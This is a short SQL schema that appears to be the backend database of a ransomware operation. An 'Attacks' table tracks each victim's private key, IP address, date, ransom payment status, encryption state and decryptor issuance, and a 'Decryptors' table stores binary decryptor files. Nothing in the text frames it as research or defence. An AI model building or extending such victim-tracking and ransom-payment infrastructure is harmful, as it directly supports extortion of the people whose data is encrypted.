CREATE TABLE IF NOT EXISTS Attacks
(
    id          SERIAL PRIMARY KEY,
    private_key VARCHAR(255) NOT NULL,
    ip          VARCHAR(255) NOT NULL,
    date        TIMESTAMP    NOT NULL,
    payed       BOOLEAN      NOT NULL DEFAULT FALSE,
    encrypted   BOOLEAN      NOT NULL DEFAULT TRUE,
    decryptor   BOOLEAN      NOT NULL DEFAULT FALSE
);

CREATE TABLE IF NOT EXISTS Decryptors
(
    id   SERIAL PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    data BYTEA
);

